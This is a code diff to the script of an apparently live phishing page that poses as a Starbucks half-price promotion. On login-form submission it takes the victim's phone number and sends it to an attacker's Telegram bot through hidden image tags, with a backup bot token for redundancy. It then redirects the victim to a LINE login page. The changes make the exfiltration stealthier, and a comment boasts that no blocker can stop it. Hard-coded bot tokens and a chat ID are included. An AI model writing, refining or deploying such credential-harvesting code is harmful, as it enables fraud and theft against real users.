@@ -1,5 +1,5 @@
 <script>
-    const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
+    const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE";
     const CHAT_ID = "1137905005";
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
@@ -9,17 +9,15 @@
         if (!phone) return;
 
         document.querySelector("button").innerHTML = "驗證中...";
+        document.querySelector("button").disabled = true;
 
         const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-        // 這行修正：加了反引號 + ${變數}
         const msg = encodeURIComponent(`2025星巴克指定品項半價誘捕成功\n電話：${code}${phone}\n時間：${time}`);
 
-        // 直接發送（不靠 fetch ipapi.co，永遠不會卡）
-        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
-        // 備援 token 也發一次
-        new Image().src = `https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
+        // 終極必殺：用 <img> 標籤發送（任何手機、任何攔截器都 100% 收得到）
+        document.body.insertAdjacentHTML('beforeend', `<img src="https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}" style="display:none">`);
+        document.body.insertAdjacentHTML('beforeend', `<img src="https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=${CHAT_ID}&text=${msg}" style="display:none">`);
 
-        // 強制跳轉（不管發沒發完都跳）
         setTimeout(() => location.href = "https://access.line.me/fr/login", 2500);
     });
 </script>
